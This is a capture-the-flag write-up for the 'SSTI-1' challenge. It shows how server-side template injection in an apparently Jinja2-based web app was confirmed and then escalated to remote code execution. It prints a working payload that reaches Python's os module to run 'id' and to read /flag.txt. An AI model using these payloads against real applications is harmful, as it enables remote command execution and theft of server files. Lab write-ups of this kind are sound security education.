# SSTI-1 CTF – Writeup

## 📌 Challenge Description
The **SSTI-1** challenge is based on **Server-Side Template Injection (SSTI)**.  
SSTI vulnerabilities occur when user input is embedded directly into a server-side template without proper sanitization, allowing an attacker to execute arbitrary code through template expressions.  

The goal of this challenge was to identify and exploit an SSTI vulnerability to extract the flag.

---

## 🛠️ Walkthrough / Solution

### 1. Understanding the Input Field
The challenge presented a web application with an input field. Any text entered was reflected back in the page response.  
This suggested that the server was processing user input within a template engine.

---

### 2. Testing for Template Injection
To confirm if it was vulnerable to SSTI, I tried injecting a basic expression:

```jinja
{{7*7}}
```

If the page rendered **49** instead of the literal string `{{7*7}}`, it confirmed the vulnerability.  
This meant the application was using a template engine (likely **Jinja2** in Python).

---

### 3. Exploiting the Vulnerability
After confirming SSTI, I attempted to break out of the template sandbox and execute system commands.  
The payload I used was:

```jinja
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

✅ This successfully executed the `id` command on the server and returned the result, proving **Remote Code Execution (RCE)**.

---

### 4. Extracting the Flag
Once command execution was achieved, I used a similar payload to read files on the server.  
Typically, flags are stored in `/flag.txt`. To read it:

```jinja
{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}
```

This displayed the flag in the response.

---

## 🔑 Key Takeaways
- Confirmed SSTI by testing with `{{7*7}}`.  
- Used Python object traversal to access `os` module.  
- Achieved **RCE** with the payload:  
  ```jinja
  {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
  ```
- Retrieved the flag by reading `/flag.txt`.  

